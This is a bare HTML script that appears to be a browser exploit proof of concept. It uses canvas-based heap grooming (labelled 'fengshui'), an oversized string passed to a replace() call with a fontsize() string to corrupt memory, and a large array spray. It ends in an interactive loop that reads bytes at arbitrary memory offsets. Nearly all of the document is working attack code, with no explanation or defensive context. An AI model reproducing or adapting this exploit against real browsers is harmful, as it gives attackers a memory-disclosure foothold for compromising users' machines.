<script>	
alert("start with uint8 value:0xA2A");
function gc() {
    try {
        var c = document.createElement("canvas");
        var gl = c.getContext("2d");

        for (var i = 0; i < 100; i++) {
            var gggg = gl.createImageData(1, 0x2000)
        }
    } catch (e) {

    }
}
function createStringWithRepeatedChar(c, multiplicity) {
    while (c.length < multiplicity)

        c += c;

    return c;

}
gc();
var size = 0x220; //fengshui size
var multiplicity = size/2;
multiplicity -= 22;
multiplicity -= 0x10;
var c = "\u0000\u0000\u8000\u0000"
while (c.length < multiplicity){
c += c;
}
c = c.substring(0, multiplicity);
var x = "1";
var getSize = function(size) {return (size-0x14)/2}; //string header size = 0x20
x = createStringWithRepeatedChar(x, 0x1000000);
x += '2';
var y = null;
var arr = new Array(0x50);
var cvs = document.createElement('canvas');
//fill some hole
for (var i = 0; i < arr.length; i++) {
arr[i] = c.fontsize(1);
}
var s1 = c.fontsize(1) ;
x.replace(/\d/g, s1);
c = '';
alert("ok");

if (1) {
try{
    //var s_size = 0x10000;
    var cnt = 0x1e00//(s_size-0x14)/8;
    //alert(1)
    var spray = new Array(0x1000);
    alert(2)
    for (var i=0; i<0x1000; i++) {
        spray[i] = new Array(cnt);
        for (var j=0; j<cnt; j++) {
            spray[i][j] = 0x666
        }
    }
    alert('ok2');


}catch(e){alert(e)}
} else {
    var spray=new Uint8Array(0x10000000);
        for(var i=0;i<spray.length;i++){
         //spray[i]=0xAA;   
        }
}

var a=0;
var b="";
while(1){
a=prompt("addr");
b="";
if(a==0){
 break;   
}
a=a/2;
b+=s1.charCodeAt(a).toString(16);
b+=" ";
b+=s1.charCodeAt(a+1).toString(16);
b+=" ";
b+=s1.charCodeAt(a+2).toString(16);
b+=" ";
b+=s1.charCodeAt(a+3).toString(16);
alert(b);
}
</script>
